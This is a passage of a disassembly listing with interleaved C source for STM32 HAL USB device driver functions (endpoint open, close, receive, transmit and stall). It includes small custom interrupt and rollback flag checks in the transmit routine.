 8001fdc:	d12b      	bne.n	8002036 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001fde:	687b      	ldr	r3, [r7, #4]
 8001fe0:	681b      	ldr	r3, [r3, #0]
 8001fe2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001fe6:	b29a      	uxth	r2, r3
 8001fe8:	687b      	ldr	r3, [r7, #4]
 8001fea:	681b      	ldr	r3, [r3, #0]
 8001fec:	f042 0204 	orr.w	r2, r2, #4
 8001ff0:	b292      	uxth	r2, r2
 8001ff2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001ff6:	687b      	ldr	r3, [r7, #4]
 8001ff8:	681b      	ldr	r3, [r3, #0]
 8001ffa:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001ffe:	b29a      	uxth	r2, r3
 8002000:	687b      	ldr	r3, [r7, #4]
 8002002:	681b      	ldr	r3, [r3, #0]
 8002004:	f042 0208 	orr.w	r2, r2, #8
 8002008:	b292      	uxth	r2, r2
 800200a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 800200e:	687b      	ldr	r3, [r7, #4]
 8002010:	2201      	movs	r2, #1
 8002012:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 8002016:	687b      	ldr	r3, [r7, #4]
 8002018:	681b      	ldr	r3, [r3, #0]
 800201a:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800201e:	b29b      	uxth	r3, r3
 8002020:	089b      	lsrs	r3, r3, #2
 8002022:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 8002026:	687b      	ldr	r3, [r7, #4]
 8002028:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 800202c:	2101      	movs	r1, #1
 800202e:	6878      	ldr	r0, [r7, #4]
 8002030:	f00a ff58 	bl	800cee4 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 8002034:	e02a      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 8002036:	6878      	ldr	r0, [r7, #4]
 8002038:	f00a fc96 	bl	800c968 <HAL_PCD_SuspendCallback>
    return;
 800203c:	e026      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 800203e:	68fb      	ldr	r3, [r7, #12]
 8002040:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8002044:	2b00      	cmp	r3, #0
 8002046:	d00f      	beq.n	8002068 <HAL_PCD_IRQHandler+0x224>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SOF);
 8002048:	687b      	ldr	r3, [r7, #4]
 800204a:	681b      	ldr	r3, [r3, #0]
 800204c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002050:	b29a      	uxth	r2, r3
 8002052:	687b      	ldr	r3, [r7, #4]
 8002054:	681b      	ldr	r3, [r3, #0]
 8002056:	f422 7200 	bic.w	r2, r2, #512	; 0x200
 800205a:	b292      	uxth	r2, r2
 800205c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SOFCallback(hpcd);
#else
    HAL_PCD_SOFCallback(hpcd);
 8002060:	6878      	ldr	r0, [r7, #4]
 8002062:	f00a fc54 	bl	800c90e <HAL_PCD_SOFCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8002066:	e011      	b.n	800208c <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ESOF) == USB_ISTR_ESOF)
 8002068:	68fb      	ldr	r3, [r7, #12]
 800206a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800206e:	2b00      	cmp	r3, #0
 8002070:	d00c      	beq.n	800208c <HAL_PCD_IRQHandler+0x248>
  {
    /* clear ESOF flag in ISTR */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ESOF);
 8002072:	687b      	ldr	r3, [r7, #4]
 8002074:	681b      	ldr	r3, [r3, #0]
 8002076:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 800207a:	b29a      	uxth	r2, r3
 800207c:	687b      	ldr	r3, [r7, #4]
 800207e:	681b      	ldr	r3, [r3, #0]
 8002080:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8002084:	b292      	uxth	r2, r2
 8002086:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 800208a:	bf00      	nop
  }
}
 800208c:	3710      	adds	r7, #16
 800208e:	46bd      	mov	sp, r7
 8002090:	bd80      	pop	{r7, pc}

08002092 <HAL_PCD_SetAddress>:
  * @param  hpcd PCD handle
  * @param  address new device address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)
{
 8002092:	b580      	push	{r7, lr}
 8002094:	b082      	sub	sp, #8
 8002096:	af00      	add	r7, sp, #0
 8002098:	6078      	str	r0, [r7, #4]
 800209a:	460b      	mov	r3, r1
 800209c:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 800209e:	687b      	ldr	r3, [r7, #4]
 80020a0:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80020a4:	2b01      	cmp	r3, #1
 80020a6:	d101      	bne.n	80020ac <HAL_PCD_SetAddress+0x1a>
 80020a8:	2302      	movs	r3, #2
 80020aa:	e013      	b.n	80020d4 <HAL_PCD_SetAddress+0x42>
 80020ac:	687b      	ldr	r3, [r7, #4]
 80020ae:	2201      	movs	r2, #1
 80020b0:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  hpcd->USB_Address = address;
 80020b4:	687b      	ldr	r3, [r7, #4]
 80020b6:	78fa      	ldrb	r2, [r7, #3]
 80020b8:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  (void)USB_SetDevAddress(hpcd->Instance, address);
 80020bc:	687b      	ldr	r3, [r7, #4]
 80020be:	681b      	ldr	r3, [r3, #0]
 80020c0:	78fa      	ldrb	r2, [r7, #3]
 80020c2:	4611      	mov	r1, r2
 80020c4:	4618      	mov	r0, r3
 80020c6:	f006 f94a 	bl	800835e <USB_SetDevAddress>
  __HAL_UNLOCK(hpcd);
 80020ca:	687b      	ldr	r3, [r7, #4]
 80020cc:	2200      	movs	r2, #0
 80020ce:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80020d2:	2300      	movs	r3, #0
}
 80020d4:	4618      	mov	r0, r3
 80020d6:	3708      	adds	r7, #8
 80020d8:	46bd      	mov	sp, r7
 80020da:	bd80      	pop	{r7, pc}

080020dc <HAL_PCD_EP_Open>:
  * @param  ep_type endpoint type
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr,
                                  uint16_t ep_mps, uint8_t ep_type)
{
 80020dc:	b580      	push	{r7, lr}
 80020de:	b084      	sub	sp, #16
 80020e0:	af00      	add	r7, sp, #0
 80020e2:	6078      	str	r0, [r7, #4]
 80020e4:	4608      	mov	r0, r1
 80020e6:	4611      	mov	r1, r2
 80020e8:	461a      	mov	r2, r3
 80020ea:	4603      	mov	r3, r0
 80020ec:	70fb      	strb	r3, [r7, #3]
 80020ee:	460b      	mov	r3, r1
 80020f0:	803b      	strh	r3, [r7, #0]
 80020f2:	4613      	mov	r3, r2
 80020f4:	70bb      	strb	r3, [r7, #2]
  HAL_StatusTypeDef  ret = HAL_OK;
 80020f6:	2300      	movs	r3, #0
 80020f8:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80020fa:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80020fe:	2b00      	cmp	r3, #0
 8002100:	da0e      	bge.n	8002120 <HAL_PCD_EP_Open+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002102:	78fb      	ldrb	r3, [r7, #3]
 8002104:	f003 0307 	and.w	r3, r3, #7
 8002108:	1c5a      	adds	r2, r3, #1
 800210a:	4613      	mov	r3, r2
 800210c:	009b      	lsls	r3, r3, #2
 800210e:	4413      	add	r3, r2
 8002110:	00db      	lsls	r3, r3, #3
 8002112:	687a      	ldr	r2, [r7, #4]
 8002114:	4413      	add	r3, r2
 8002116:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002118:	68fb      	ldr	r3, [r7, #12]
 800211a:	2201      	movs	r2, #1
 800211c:	705a      	strb	r2, [r3, #1]
 800211e:	e00e      	b.n	800213e <HAL_PCD_EP_Open+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002120:	78fb      	ldrb	r3, [r7, #3]
 8002122:	f003 0207 	and.w	r2, r3, #7
 8002126:	4613      	mov	r3, r2
 8002128:	009b      	lsls	r3, r3, #2
 800212a:	4413      	add	r3, r2
 800212c:	00db      	lsls	r3, r3, #3
 800212e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002132:	687a      	ldr	r2, [r7, #4]
 8002134:	4413      	add	r3, r2
 8002136:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002138:	68fb      	ldr	r3, [r7, #12]
 800213a:	2200      	movs	r2, #0
 800213c:	705a      	strb	r2, [r3, #1]
  }

  ep->num = ep_addr & EP_ADDR_MSK;
 800213e:	78fb      	ldrb	r3, [r7, #3]
 8002140:	f003 0307 	and.w	r3, r3, #7
 8002144:	b2da      	uxtb	r2, r3
 8002146:	68fb      	ldr	r3, [r7, #12]
 8002148:	701a      	strb	r2, [r3, #0]
  ep->maxpacket = ep_mps;
 800214a:	883a      	ldrh	r2, [r7, #0]
 800214c:	68fb      	ldr	r3, [r7, #12]
 800214e:	611a      	str	r2, [r3, #16]
  ep->type = ep_type;
 8002150:	68fb      	ldr	r3, [r7, #12]
 8002152:	78ba      	ldrb	r2, [r7, #2]
 8002154:	70da      	strb	r2, [r3, #3]
    ep->tx_fifo_num = ep->num;
  }
#endif /* defined (USB_OTG_FS) */

  /* Set initial data PID. */
  if (ep_type == EP_TYPE_BULK)
 8002156:	78bb      	ldrb	r3, [r7, #2]
 8002158:	2b02      	cmp	r3, #2
 800215a:	d102      	bne.n	8002162 <HAL_PCD_EP_Open+0x86>
  {
    ep->data_pid_start = 0U;
 800215c:	68fb      	ldr	r3, [r7, #12]
 800215e:	2200      	movs	r2, #0
 8002160:	711a      	strb	r2, [r3, #4]
  }

  __HAL_LOCK(hpcd);
 8002162:	687b      	ldr	r3, [r7, #4]
 8002164:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002168:	2b01      	cmp	r3, #1
 800216a:	d101      	bne.n	8002170 <HAL_PCD_EP_Open+0x94>
 800216c:	2302      	movs	r3, #2
 800216e:	e00e      	b.n	800218e <HAL_PCD_EP_Open+0xb2>
 8002170:	687b      	ldr	r3, [r7, #4]
 8002172:	2201      	movs	r2, #1
 8002174:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_ActivateEndpoint(hpcd->Instance, ep);
 8002178:	687b      	ldr	r3, [r7, #4]
 800217a:	681b      	ldr	r3, [r3, #0]
 800217c:	68f9      	ldr	r1, [r7, #12]
 800217e:	4618      	mov	r0, r3
 8002180:	f003 fe8c 	bl	8005e9c <USB_ActivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002184:	687b      	ldr	r3, [r7, #4]
 8002186:	2200      	movs	r2, #0
 8002188:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return ret;
 800218c:	7afb      	ldrb	r3, [r7, #11]
}
 800218e:	4618      	mov	r0, r3
 8002190:	3710      	adds	r7, #16
 8002192:	46bd      	mov	sp, r7
 8002194:	bd80      	pop	{r7, pc}

08002196 <HAL_PCD_EP_Close>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Close(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002196:	b580      	push	{r7, lr}
 8002198:	b084      	sub	sp, #16
 800219a:	af00      	add	r7, sp, #0
 800219c:	6078      	str	r0, [r7, #4]
 800219e:	460b      	mov	r3, r1
 80021a0:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if ((ep_addr & 0x80U) == 0x80U)
 80021a2:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80021a6:	2b00      	cmp	r3, #0
 80021a8:	da0e      	bge.n	80021c8 <HAL_PCD_EP_Close+0x32>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80021aa:	78fb      	ldrb	r3, [r7, #3]
 80021ac:	f003 0307 	and.w	r3, r3, #7
 80021b0:	1c5a      	adds	r2, r3, #1
 80021b2:	4613      	mov	r3, r2
 80021b4:	009b      	lsls	r3, r3, #2
 80021b6:	4413      	add	r3, r2
 80021b8:	00db      	lsls	r3, r3, #3
 80021ba:	687a      	ldr	r2, [r7, #4]
 80021bc:	4413      	add	r3, r2
 80021be:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80021c0:	68fb      	ldr	r3, [r7, #12]
 80021c2:	2201      	movs	r2, #1
 80021c4:	705a      	strb	r2, [r3, #1]
 80021c6:	e00e      	b.n	80021e6 <HAL_PCD_EP_Close+0x50>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80021c8:	78fb      	ldrb	r3, [r7, #3]
 80021ca:	f003 0207 	and.w	r2, r3, #7
 80021ce:	4613      	mov	r3, r2
 80021d0:	009b      	lsls	r3, r3, #2
 80021d2:	4413      	add	r3, r2
 80021d4:	00db      	lsls	r3, r3, #3
 80021d6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80021da:	687a      	ldr	r2, [r7, #4]
 80021dc:	4413      	add	r3, r2
 80021de:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80021e0:	68fb      	ldr	r3, [r7, #12]
 80021e2:	2200      	movs	r2, #0
 80021e4:	705a      	strb	r2, [r3, #1]
  }
  ep->num = ep_addr & EP_ADDR_MSK;
 80021e6:	78fb      	ldrb	r3, [r7, #3]
 80021e8:	f003 0307 	and.w	r3, r3, #7
 80021ec:	b2da      	uxtb	r2, r3
 80021ee:	68fb      	ldr	r3, [r7, #12]
 80021f0:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80021f2:	687b      	ldr	r3, [r7, #4]
 80021f4:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80021f8:	2b01      	cmp	r3, #1
 80021fa:	d101      	bne.n	8002200 <HAL_PCD_EP_Close+0x6a>
 80021fc:	2302      	movs	r3, #2
 80021fe:	e00e      	b.n	800221e <HAL_PCD_EP_Close+0x88>
 8002200:	687b      	ldr	r3, [r7, #4]
 8002202:	2201      	movs	r2, #1
 8002204:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 8002208:	687b      	ldr	r3, [r7, #4]
 800220a:	681b      	ldr	r3, [r3, #0]
 800220c:	68f9      	ldr	r1, [r7, #12]
 800220e:	4618      	mov	r0, r3
 8002210:	f004 fa08 	bl	8006624 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002214:	687b      	ldr	r3, [r7, #4]
 8002216:	2200      	movs	r2, #0
 8002218:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 800221c:	2300      	movs	r3, #0
}
 800221e:	4618      	mov	r0, r3
 8002220:	3710      	adds	r7, #16
 8002222:	46bd      	mov	sp, r7
 8002224:	bd80      	pop	{r7, pc}

08002226 <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 8002226:	b580      	push	{r7, lr}
 8002228:	b086      	sub	sp, #24
 800222a:	af00      	add	r7, sp, #0
 800222c:	60f8      	str	r0, [r7, #12]
 800222e:	607a      	str	r2, [r7, #4]
 8002230:	603b      	str	r3, [r7, #0]
 8002232:	460b      	mov	r3, r1
 8002234:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002236:	7afb      	ldrb	r3, [r7, #11]
 8002238:	f003 0207 	and.w	r2, r3, #7
 800223c:	4613      	mov	r3, r2
 800223e:	009b      	lsls	r3, r3, #2
 8002240:	4413      	add	r3, r2
 8002242:	00db      	lsls	r3, r3, #3
 8002244:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002248:	68fa      	ldr	r2, [r7, #12]
 800224a:	4413      	add	r3, r2
 800224c:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 800224e:	697b      	ldr	r3, [r7, #20]
 8002250:	687a      	ldr	r2, [r7, #4]
 8002252:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002254:	697b      	ldr	r3, [r7, #20]
 8002256:	683a      	ldr	r2, [r7, #0]
 8002258:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 800225a:	697b      	ldr	r3, [r7, #20]
 800225c:	2200      	movs	r2, #0
 800225e:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 8002260:	697b      	ldr	r3, [r7, #20]
 8002262:	2200      	movs	r2, #0
 8002264:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002266:	7afb      	ldrb	r3, [r7, #11]
 8002268:	f003 0307 	and.w	r3, r3, #7
 800226c:	b2da      	uxtb	r2, r3
 800226e:	697b      	ldr	r3, [r7, #20]
 8002270:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002272:	68fb      	ldr	r3, [r7, #12]
 8002274:	681b      	ldr	r3, [r3, #0]
 8002276:	6979      	ldr	r1, [r7, #20]
 8002278:	4618      	mov	r0, r3
 800227a:	f004 fbc0 	bl	80069fe <USB_EPStartXfer>

  return HAL_OK;
 800227e:	2300      	movs	r3, #0
}
 8002280:	4618      	mov	r0, r3
 8002282:	3718      	adds	r7, #24
 8002284:	46bd      	mov	sp, r7
 8002286:	bd80      	pop	{r7, pc}

08002288 <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 8002288:	b480      	push	{r7}
 800228a:	b083      	sub	sp, #12
 800228c:	af00      	add	r7, sp, #0
 800228e:	6078      	str	r0, [r7, #4]
 8002290:	460b      	mov	r3, r1
 8002292:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002294:	78fb      	ldrb	r3, [r7, #3]
 8002296:	f003 0207 	and.w	r2, r3, #7
 800229a:	6879      	ldr	r1, [r7, #4]
 800229c:	4613      	mov	r3, r2
 800229e:	009b      	lsls	r3, r3, #2
 80022a0:	4413      	add	r3, r2
 80022a2:	00db      	lsls	r3, r3, #3
 80022a4:	440b      	add	r3, r1
 80022a6:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 80022aa:	681b      	ldr	r3, [r3, #0]
}
 80022ac:	4618      	mov	r0, r3
 80022ae:	370c      	adds	r7, #12
 80022b0:	46bd      	mov	sp, r7
 80022b2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022b6:	4770      	bx	lr

080022b8 <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 80022b8:	b580      	push	{r7, lr}
 80022ba:	b086      	sub	sp, #24
 80022bc:	af00      	add	r7, sp, #0
 80022be:	60f8      	str	r0, [r7, #12]
 80022c0:	607a      	str	r2, [r7, #4]
 80022c2:	603b      	str	r3, [r7, #0]
 80022c4:	460b      	mov	r3, r1
 80022c6:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80022c8:	7afb      	ldrb	r3, [r7, #11]
 80022ca:	f003 0307 	and.w	r3, r3, #7
 80022ce:	1c5a      	adds	r2, r3, #1
 80022d0:	4613      	mov	r3, r2
 80022d2:	009b      	lsls	r3, r3, #2
 80022d4:	4413      	add	r3, r2
 80022d6:	00db      	lsls	r3, r3, #3
 80022d8:	68fa      	ldr	r2, [r7, #12]
 80022da:	4413      	add	r3, r2
 80022dc:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80022de:	697b      	ldr	r3, [r7, #20]
 80022e0:	687a      	ldr	r2, [r7, #4]
 80022e2:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80022e4:	697b      	ldr	r3, [r7, #20]
 80022e6:	683a      	ldr	r2, [r7, #0]
 80022e8:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 80022ea:	697b      	ldr	r3, [r7, #20]
 80022ec:	2201      	movs	r2, #1
 80022ee:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 80022f2:	697b      	ldr	r3, [r7, #20]
 80022f4:	683a      	ldr	r2, [r7, #0]
 80022f6:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 80022f8:	697b      	ldr	r3, [r7, #20]
 80022fa:	2200      	movs	r2, #0
 80022fc:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 80022fe:	697b      	ldr	r3, [r7, #20]
 8002300:	2201      	movs	r2, #1
 8002302:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002304:	7afb      	ldrb	r3, [r7, #11]
 8002306:	f003 0307 	and.w	r3, r3, #7
 800230a:	b2da      	uxtb	r2, r3
 800230c:	697b      	ldr	r3, [r7, #20]
 800230e:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 8002310:	4b0e      	ldr	r3, [pc, #56]	; (800234c <HAL_PCD_EP_Transmit+0x94>)
 8002312:	781b      	ldrb	r3, [r3, #0]
 8002314:	f003 0302 	and.w	r3, r3, #2
 8002318:	2b00      	cmp	r3, #0
 800231a:	d102      	bne.n	8002322 <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 800231c:	4b0c      	ldr	r3, [pc, #48]	; (8002350 <HAL_PCD_EP_Transmit+0x98>)
 800231e:	2201      	movs	r2, #1
 8002320:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002322:	68fb      	ldr	r3, [r7, #12]
 8002324:	681b      	ldr	r3, [r3, #0]
 8002326:	6979      	ldr	r1, [r7, #20]
 8002328:	4618      	mov	r0, r3
 800232a:	f004 fb68 	bl	80069fe <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 800232e:	4b07      	ldr	r3, [pc, #28]	; (800234c <HAL_PCD_EP_Transmit+0x94>)
 8002330:	781b      	ldrb	r3, [r3, #0]
 8002332:	f003 0302 	and.w	r3, r3, #2
 8002336:	2b00      	cmp	r3, #0
 8002338:	d102      	bne.n	8002340 <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 800233a:	4b06      	ldr	r3, [pc, #24]	; (8002354 <HAL_PCD_EP_Transmit+0x9c>)
 800233c:	2201      	movs	r2, #1
 800233e:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 8002340:	2300      	movs	r3, #0
}
 8002342:	4618      	mov	r0, r3
 8002344:	3718      	adds	r7, #24
 8002346:	46bd      	mov	sp, r7
 8002348:	bd80      	pop	{r7, pc}
 800234a:	bf00      	nop
 800234c:	2000026c 	.word	0x2000026c
 8002350:	20000270 	.word	0x20000270
 8002354:	2000027c 	.word	0x2000027c

08002358 <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002358:	b580      	push	{r7, lr}
 800235a:	b084      	sub	sp, #16
 800235c:	af00      	add	r7, sp, #0
 800235e:	6078      	str	r0, [r7, #4]
 8002360:	460b      	mov	r3, r1
 8002362:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 8002364:	78fb      	ldrb	r3, [r7, #3]
 8002366:	f003 0207 	and.w	r2, r3, #7
 800236a:	687b      	ldr	r3, [r7, #4]
 800236c:	685b      	ldr	r3, [r3, #4]
 800236e:	429a      	cmp	r2, r3
 8002370:	d901      	bls.n	8002376 <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 8002372:	2301      	movs	r3, #1
 8002374:	e04c      	b.n	8002410 <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 8002376:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800237a:	2b00      	cmp	r3, #0
 800237c:	da0e      	bge.n	800239c <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800237e:	78fb      	ldrb	r3, [r7, #3]
 8002380:	f003 0307 	and.w	r3, r3, #7
 8002384:	1c5a      	adds	r2, r3, #1
 8002386:	4613      	mov	r3, r2
 8002388:	009b      	lsls	r3, r3, #2
 800238a:	4413      	add	r3, r2
 800238c:	00db      	lsls	r3, r3, #3
 800238e:	687a      	ldr	r2, [r7, #4]
 8002390:	4413      	add	r3, r2
 8002392:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002394:	68fb      	ldr	r3, [r7, #12]
 8002396:	2201      	movs	r2, #1
 8002398:	705a      	strb	r2, [r3, #1]
 800239a:	e00c      	b.n	80023b6 <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 800239c:	78fa      	ldrb	r2, [r7, #3]
 800239e:	4613      	mov	r3, r2
 80023a0:	009b      	lsls	r3, r3, #2
 80023a2:	4413      	add	r3, r2
 80023a4:	00db      	lsls	r3, r3, #3
 80023a6:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80023aa:	687a      	ldr	r2, [r7, #4]
 80023ac:	4413      	add	r3, r2
 80023ae:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80023b0:	68fb      	ldr	r3, [r7, #12]
 80023b2:	2200      	movs	r2, #0
 80023b4:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 80023b6:	68fb      	ldr	r3, [r7, #12]
 80023b8:	2201      	movs	r2, #1
 80023ba:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80023bc:	78fb      	ldrb	r3, [r7, #3]
 80023be:	f003 0307 	and.w	r3, r3, #7
 80023c2:	b2da      	uxtb	r2, r3
 80023c4:	68fb      	ldr	r3, [r7, #12]
 80023c6:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80023c8:	687b      	ldr	r3, [r7, #4]
 80023ca:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023ce:	2b01      	cmp	r3, #1
 80023d0:	d101      	bne.n	80023d6 <HAL_PCD_EP_SetStall+0x7e>
 80023d2:	2302      	movs	r3, #2
 80023d4:	e01c      	b.n	8002410 <HAL_PCD_EP_SetStall+0xb8>
 80023d6:	687b      	ldr	r3, [r7, #4]
 80023d8:	2201      	movs	r2, #1
 80023da:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 80023de:	687b      	ldr	r3, [r7, #4]
 80023e0:	681b      	ldr	r3, [r3, #0]
 80023e2:	68f9      	ldr	r1, [r7, #12]
 80023e4:	4618      	mov	r0, r3
 80023e6:	f005 febb 	bl	8008160 <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 80023ea:	78fb      	ldrb	r3, [r7, #3]
 80023ec:	f003 0307 	and.w	r3, r3, #7
 80023f0:	2b00      	cmp	r3, #0
 80023f2:	d108      	bne.n	8002406 <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
